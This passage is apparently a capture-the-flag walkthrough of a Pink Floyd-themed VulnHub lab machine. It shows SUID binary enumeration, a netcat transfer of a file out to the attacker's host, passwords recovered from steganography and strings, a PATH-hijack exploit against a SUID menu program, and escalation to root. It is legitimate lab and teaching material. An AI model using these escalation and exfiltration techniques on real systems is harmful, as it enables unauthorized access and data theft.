-rw-r--r--  1 RogerWaters  RogerWaters   2.8K Oct 26 08:57 bio.txt
-rw-r--r--  1 RogerWaters  RogerWaters     0B Oct 28 05:02 mbox
-rw-r--r--  1 RogerWaters  RogerWaters  47.0K Oct 26 06:16 roger_waters_profile_pic.jpg
-rw-r--r--  1 RogerWaters  RogerWaters  16.2K Oct 26 06:23 secret-diary
$ 

Find SUID binaries
$ cd /home
$ ls -lah
total 28
drwxr-xr-x   7 root           wheel           512B Oct 24 17:36 .
drwxr-xr-x  13 root           wheel           512B Oct 24 18:03 ..
drwx------   4 DavidGilmour   DavidGilmour    512B Oct 28 09:28 DavidGilmour
drwx------   3 NickMason      NickMason       512B Aug  8 00:33 NickMason
drwx------   3 RichardWright  RichardWright   512B Nov 27 02:02 RichardWright
drwx------   3 RogerWaters    RogerWaters     512B Oct 28 09:29 RogerWaters
drwxr-xr-x   4 root           SydBarrett      512B Oct 24 18:03 SydBarrett
$ find / -user NickMason 2>/dev/null
/home/NickMason
/usr/local/bin/brick
$ ls -lah /usr/local/bin/brick
-rws--s--x  1 NickMason  NickMason   7.1K Aug  8 00:33 /usr/local/bin/brick
$ find / -user DavidGilmour 2>/dev/null
/home/DavidGilmour
/usr/local/bin/shineon
$ ls -lah /usr/local/bin/shineon
-rwsr-s---  1 DavidGilmour  RichardWright   7.3K Oct 25 07:58 /usr/local/bin/shineon
$ 

Executing the SUID binary
$ whoami 
RogerWaters
$ /usr/local/bin/brick 




What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!




Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
$ id
uid=1001(NickMason) gid=1001(NickMason) groups=1002(RogerWaters)
$ whoami                                                                                                                                                                                                          
NickMason
$ 
$ cd /home/                                                                                                                                                                                                       
$ ls -lah
total 28
drwxr-xr-x   7 root           wheel           512B Oct 24 17:36 .
drwxr-xr-x  13 root           wheel           512B Oct 24 18:03 ..
drwx------   4 DavidGilmour   DavidGilmour    512B Oct 28 09:28 DavidGilmour
drwx------   3 NickMason      NickMason       512B Aug  8 00:33 NickMason
drwx------   3 RichardWright  RichardWright   512B Nov 27 02:02 RichardWright
drwx------   3 RogerWaters    RogerWaters     512B Oct 28 09:29 RogerWaters
drwxr-xr-x   4 root           SydBarrett      512B Oct 24 18:03 SydBarrett
$ cd NickMason/                                                                                                                                                                                                   
$ ls
bio.txt                       mbox                          nick_mason_profile_pic.jpg
$ file nick_mason_profile_pic.jpg                                                                                                                                                                                 
nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, 44100 Hz, created by: Xiph.Org libVorbis I
$ 

Transfer the file to host machine for further analysis
On Host
root@kali:~# nc -l -p 1234 > nick_mason_profile_pic.jpg
On Victim
$ ifconfig                                                                                                                                                                                                        
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 32768
        priority: 0
        groups: lo
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x3
        inet6 ::1 prefixlen 128
        inet 127.0.0.1 netmask 0xff000000
vic0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
        lladdr 00:0c:29:95:45:e4
        priority: 0
        groups: egress
        media: Ethernet autoselect
        status: active
        inet 192.168.174.141 netmask 0xffffff00 broadcast 192.168.174.255
enc0: flags=0<>
        priority: 0
        groups: enc
        status: active
pflog0: flags=141<UP,RUNNING,PROMISC> mtu 33192
        priority: 0
        groups: pflog
$ nc -w 3 192.168.174.137 1234 < nick_mason_profile_pic.jpg
$ 

7.) Analyse the nick_mason_profile_pic.jpg with Sonic Visualiser
Sonic Visualiser -> Layer -> Add Spectrogram -> All Channels Mixed
Decoding it gives -> richardwright1943farfisa
Username -> richardwright
Password -> 1943farfisa

$ su - RichardWright
Password: 1943farfisa
$ whoami                                                                                                                                                                                                          
RichardWright
$ id
uid=1003(RichardWright) gid=1003(RichardWright) groups=1003(RichardWright)
$ 

8.) Enumerating previously discovered binary
$ /usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
1

   December 2015
Su Mo Tu We Th Fr Sa
       1  2  3  4  5
 6  7  8  9 10 11 12
13 14 15 16 17 18 19
20 21 22 23 24 25 26
27 28 29 30 31      
                    
Time - The Dark Side of the Moon

Press ENTER to continue.
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
2
Echoes - Meddle
RogerWaters ttyp0    Dec 18 01:09   (192.168.174.137)


Press ENTER to continue.
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
3
Is There Anybody Out There? - The Wall
PING www.google.com (216.58.197.36): 56 data bytes
64 bytes from 216.58.197.36: icmp_seq=0 ttl=128 time=36.184 ms
64 bytes from 216.58.197.36: icmp_seq=1 ttl=128 time=37.852 ms
64 bytes from 216.58.197.36: icmp_seq=2 ttl=128 time=33.748 ms
--- www.google.com ping statistics ---
3 packets transmitted, 3 packets received, 0.0% packet loss
round-trip min/avg/max/std-dev = 33.748/35.928/37.852/1.685 ms
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
No mail for RichardWright
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
5
Quitting program!
$ 
$ strings /usr/local/bin/shineon
/usr/libexec/ld.so
OpenBSD
OpenBSD
libc.so.80.1
printf
__stack_smash_handler
__srget
getc
puts
system
_thread_atfork
environ
__progname
__cxa_atexit
__sF
__isthreaded
scanf
_Jv_RegisterClasses
__got_start
__got_end
__data_start
_edata
__bss_start
__progname_storage
__fini
__init_tcb
QRP1
[^_]
Menu
1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
Quitting program!
Invalid choice!
load_menu
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to continue.
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping -c 3 www.google.com
Keep Talking- The Division Bell
mail
$ 

9.) Path manipulation of mail binary
All commands are using absolute path except mail.
Exploit by setting the environment PATH variable to current working directory.
$ pwd
/tmp
$ 
$ ln -s /bin/sh mail 
$ export PATH=.:$PATH
$ /usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
$ id
uid=1003(RichardWright) euid=1004(DavidGilmour) gid=1003(RichardWright) groups=1003(RichardWright)
$

10.) Further enumerating DavidGilmour
$ cd /home/                                                                                                                                                                                                       
$ ls -lah
total 28
drwxr-xr-x   7 root           wheel           512B Oct 24 17:36 .
drwxr-xr-x  13 root           wheel           512B Oct 24 18:03 ..
drwx------   4 DavidGilmour   DavidGilmour    512B Oct 28 09:28 DavidGilmour
drwx------   3 NickMason      NickMason       512B Aug  8 00:33 NickMason
drwx------   3 RichardWright  RichardWright   512B Nov 27 02:02 RichardWright
drwx------   3 RogerWaters    RogerWaters     512B Oct 28 09:29 RogerWaters
drwxr-xr-x   4 root           SydBarrett      512B Oct 24 18:03 SydBarrett
$ cd DavidGilmour/                                                                                                                                                                                                
$ ls -lah
total 408
drwx------  4 DavidGilmour  DavidGilmour   512B Oct 28 09:28 .
drwxr-xr-x  7 root          wheel          512B Oct 24 17:36 ..
-rw-r--r--  1 DavidGilmour  DavidGilmour    87B Oct 24 17:36 .Xdefaults
-rw-r--r--  1 DavidGilmour  DavidGilmour   773B Oct 24 17:36 .cshrc
-rw-r--r--  1 DavidGilmour  DavidGilmour   103B Oct 24 17:36 .cvsrc
-rw-r--r--  1 DavidGilmour  DavidGilmour   398B Oct 24 17:36 .login
-rw-r--r--  1 DavidGilmour  DavidGilmour   175B Oct 24 17:36 .mailrc
drwx------  2 DavidGilmour  DavidGilmour   512B Oct 26 11:44 .private
-rw-r--r--  1 DavidGilmour  DavidGilmour   218B Oct 24 17:36 .profile
drwx------  2 DavidGilmour  DavidGilmour   512B Oct 28 05:16 .ssh
-rw-------  1 DavidGilmour  DavidGilmour   384B Aug  8 00:33 anotherbrick.txt
-rw-r--r--  1 DavidGilmour  DavidGilmour  1022B Oct 26 08:59 bio.txt
-rwxr-----  1 DavidGilmour  DavidGilmour   178K Oct 28 08:50 david_gilmour_profile_pic.jpg
-rw-r--r--  1 DavidGilmour  DavidGilmour   785B Oct 27 01:43 mbox
$ strings david_gilmour_profile_pic.jpg                                                                                                                                                                           
JFIF
Ducky
zhttp://ns.adobe.com/xap/1.0/
<?xpacket begin="
" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 4.2.2-c063 53.352624, 2008/07/30-18:05:41        ">
 <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about=""
    xmlns:dc="http://purl.org/dc/elements/1.1/"
    xmlns:xmpRights="http://ns.adobe.com/xap/1.0/rights/"
    xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/"
    xmlns:Iptc4xmpCore="http://iptc.org/std/Iptc4xmpCore/1.0/xmlns/"
   xmpRights:WebStatement=""
   photoshop:AuthorsPosition="Contributor">
   <dc:rights>
    <rdf:Alt>
     <rdf:li xml:lang="x-default">1971 Jorgen Angel</rdf:li>
    </rdf:Alt>
   </dc:rights>
   <dc:creator>
    <rdf:Seq>
     <rdf:li>Jorgen Angel</rdf:li>
    </rdf:Seq>
   </dc:creator>
   <dc:title>
    <rdf:Alt>
     <rdf:li xml:lang="x-default">PinkFloydA_18</rdf:li>
    </rdf:Alt>
   </dc:title>
   <xmpRights:UsageTerms>
    <rdf:Alt>
     <rdf:li xml:lang="x-default"/>
    </rdf:Alt>
   </xmpRights:UsageTerms>
   <Iptc4xmpCore:CreatorContactInfo
    Iptc4xmpCore:CiAdrExtadr=""
    Iptc4xmpCore:CiAdrCity=""
    Iptc4xmpCore:CiAdrRegion=""
    Iptc4xmpCore:CiAdrPcode=""
    Iptc4xmpCore:CiAdrCtry=""
    Iptc4xmpCore:CiTelWork=""
    Iptc4xmpCore:CiEmailWork=""
    Iptc4xmpCore:CiUrlWork=""/>
  </rdf:Description>
 </rdf:RDF>
</x:xmpmeta>
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                           
<?xpacket end="w"?>
Adobe
        A2$
RbC4%q
rScd6
IjC,
vr'E
%FrWR
oh5,
%i{Zlx
<--snip-->
}sa0
Y       la!
UYij>5
)/i2
ik:H
QAD<
$ ~F
N; D0{  Q
\|<;
Nm~Lso
|mx8
~/}4
8?>>=
dy~g
|Mvk
7OnN}
Nn_}
^=>W
{w|6
Om?OoA
who_are_you_and_who_am_i
$
$ cat anotherbrick.txt                                                                                                                                                                                            
# Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond

New website for review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php

# You have to be trusted by the people you lie to. So that when they turn their backs on you, you'll get the chance to put the knife in. - Pink Floyd, Dogs 
$ 

11.) Explorint the new website
In Browser
http://192.168.174.141/pinkfloyd1965newblogsite50yearscelebration-temp/index.php
In Page Source
<!--Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes
Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?-->
http://192.168.174.141/pinkfloyd1965newblogsite50yearscelebration-temp/img/homepageimg.jpg
Modifying the brightness and contrast
/welcometothemachine
50696e6b466c6f796435305965617273

root@kali:~# echo "50696e6b466c6f796435305965617273" | xxd -p -r
PinkFloyd50Years
root@kali:~# 

Open in browser
http://192.168.174.141/welcometothemachine/
403 Forbidden
OpenBSD httpd

$ cd /var/www/htdocs/                                                                                                                                                                                             
mail: cd: /var/www/htdocs - Permission denied
$ 

$ su DavidGilmour
Password: who_are_you_and_who_am_i
$ id
uid=1004(DavidGilmour) gid=1004(DavidGilmour) groups=1004(DavidGilmour), 1(daemon), 67(www), 1005(welcometothemachine)
$ 
$ cd /var/www/htdocs/                    
$ ls -lah
total 244
drwxr-x---   4 www   welcometothemachine   512B Nov 27 01:47 .
drwxr-xr-x  11 root  daemon                512B Oct 27 03:35 ..
-rw-r--r--   1 www   www                   539B Oct 25 01:20 index.html
-rw-r--r--   1 www   www                   112K Oct 25 01:16 pink_floyd.jpg
drwxr-xr-x   7 www   www                   512B Aug  8 00:33 pinkfloyd1965newblogsite50yearscelebration-temp
drwxr-xr-x   2 root  welcometothemachine   512B Aug  8 00:33 welcometothemachine
$ cd welcometothemachine/                                                                                                                                                                                         
$ ls -lah
total 24
drwxr-xr-x  2 root  welcometothemachine   512B Aug  8 00:33 .
drwxr-x---  4 www   welcometothemachine   512B Nov 27 01:47 ..
-rws--s---  1 root  welcometothemachine   7.3K Nov 27 01:47 PinkFloyd
$ file PinkFloyd                                                                                                                                                                                                  
PinkFloyd: writable, executable, regular file, no read permission
$ ./PinkFloyd                                                                                                                                                                                                     
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: PinkFloyd50Years

Denied....
If I had my way, I'd have all of ya shot. - Pink Floyd, In The Flesh
$ ./PinkFloyd  
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now set your controls to the heart of the sun!
$ id
uid=1004(DavidGilmour) gid=1004(DavidGilmour) groups=1004(DavidGilmour), 1(daemon), 67(www), 1005(welcometothemachine)
$ sudo -i
# whoami                                                                                                                                                                                                          
root
# cat flag.txt                                                                                                                                                                                                    

"The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar"

                   Congratulations on rooting thewall!

   ___________________________________________________________________
  | |       |       |       |       |       |       |       |       | |
  |_|_______|_______|______ '__  ___|_______|_______|_______|_______|_|
  |     |       |       |   |  )      /         |       |       |     |
  |_____|_______|_______|__ |,' , .  | | _ , ___|_______|_______|_____|
  | |       |       |      ,|   | |\ | | ,' |       |       |       | |
  |_|_______|_______|____ ' | _ | | \| |'\ _|_______|_______|_______|_|
  |     |       |       |   \  _' '  ` |  \     |       |       |     |
  |_____|_______|_______|_  ,-'_ _____ | _______|_______|_______|_____|
  | |       |       |   ,-'|  _     |       |       |       |       | |
  |_|_______|_______|__  ,-|-' |  ,-. \ /_.--. _____|_______|_______|_|
  |     |       |          |   |  | |  V  |   ) |       |       |     |
  |_____|_______|_______|_ | _ |-'`-'  |  | ,' _|_______|_______|_____|
  | |       |       |      |        |  '  ;'        |       |       | |
  |_|_______|_______|______"|_____  _,- o'__|_______|_______|_______|_|
  |     |       |       |       _,-'    .       |       |       |     |
  |_____|_______|_______|_ _,--'\      _,-'_____|_______|_______|_____|
  | |       |       |     '     ||_||-' _   |       |       |       | |
  |_|_______|_______|_______|__ || ||,-'  __|_______|_______|_______|_|
  |     |       |       |       |  ||_,-'       |       |       |     |
  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
  | |       |       |   \    |     /        |       |       |       | |
  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
  |     |       |       | \      // \   |   |   |       |       |     |
  |_____|_______|_______|_ \ /\ //--'\  |   | __|_______|_______|_____|
  | |       |       |       '  V/    |  |-' |__,    |       |       | |
  |_|_______|_______|_______|_______ _______'_______|_______|_______|_|
  |     |       |       |       |       |       |       |       |     |
  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
  |_________|_______|_______|_______|_______|_______|_______|_______|_|

                  Celebrating 50 years of Pink Floyd!
             Syd Barrett (RIP), Nick Mason, Roger Waters,
               Richard Wright (RIP), and David Gilmour.


** Shoutouts **
+ @vulnhub for making it all possible
+ @rastamouse @thecolonial - "the test bunnies"

-=========================================-
-  xerubus (@xerubus - www.mogozobo.com)  -
-=========================================-
# 
